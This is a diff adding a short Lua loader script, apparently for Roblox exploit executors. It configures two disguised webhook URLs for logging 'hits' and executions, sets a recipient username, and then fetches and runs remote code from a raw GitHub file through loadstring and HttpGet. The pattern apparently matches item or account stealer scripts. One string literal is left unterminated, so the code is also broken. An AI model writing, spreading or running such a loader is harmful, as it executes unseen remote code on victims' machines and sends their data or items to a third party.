@@ -1,0 +1,9 @@
+lua
+LogsWebhook = "https://webhook-protect.vercel.app/api/webhook?id=ZGhRQUFRa2tBckF2UEFER0NfcWp4QTpQZG11czU3VEpzYzZQUzhUYm9oRkphOU42T3JSQnBEbUUtV2g0M2t2UW5zdFVtaG1lenU2WHFXdkM2bHduTG9VNHdhbkZSWWxWMU9vWVRwaUMtaVMzYW5LQXlHZ0lxUGhKYjdFNjc4OFRJUmw4Rmo5Nk9ZeUhmVGE5SWVtcDh4ZG5VMXRObnl2TTZlVUZid2ZmVmExbEFYaGRjcW13VjNiSFoyZXFIM0hNVEk"
+ExecutionWebhook = "https://webhook-protect.vercel.app/api/webhook?id=NWhETy1Oc0VFdU4zNmZoYTdKZ2NtUTpFZjN4N0E5aUZneWtVLXhvNjRqVVNxT0p5cFFBWHpST0dBUzFEaTUwZ1hxS3FTVldGMXBfWW5KMG9UREc5Mkhjbk1Wckk0M2EzWTBuMGJtb0pQekhYdVg0Tk5xZHNLT2d4Qko2aHdlbG1WUjE2QVNHTHZaRGx3X1lycFM3QlpickY5Qk9SMkF5RFRFZHVGUVRqV1Q5dW5yQUc2QjQtTWROcUFVQVEwc0RPQWM"
+Username = "dovydasprodo
+PromptText = "Start"
+RandomizedPrompt = "false"
+LoadRedzAfterHit = "false"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lelel22f/Hm/refs/heads/main/SimpleTesting"))()
